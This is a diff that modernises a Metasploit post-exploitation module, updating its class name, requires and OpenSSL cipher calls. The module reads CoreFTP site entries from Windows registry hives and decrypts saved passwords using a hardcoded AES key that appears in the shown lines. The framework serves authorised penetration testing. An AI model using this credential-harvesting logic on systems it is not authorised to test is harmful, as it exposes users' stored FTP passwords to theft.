@@ -1,13 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
@@ -35,7 +32,7 @@ class Metasploit3 < Msf::Post
       begin
         subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
         if subkeys.nil? or subkeys.empty?
-          print_status ("CoreFTP not installed for this user.")
+          print_status("CoreFTP not installed for this user.")
           next
         end
 
@@ -91,9 +88,9 @@ class Metasploit3 < Msf::Post
 
   def decrypt(encoded)
     cipher = [encoded].pack("H*")
-    aes = OpenSSL::Cipher::Cipher.new("AES-128-ECB")
-    aes.padding = 0
+    aes = OpenSSL::Cipher.new("AES-128-ECB")
     aes.decrypt
+    aes.padding = 0
     aes.key = "hdfzpysvpzimorhk"
     password = (aes.update(cipher) + aes.final).gsub(/\x00/,'')
     return password
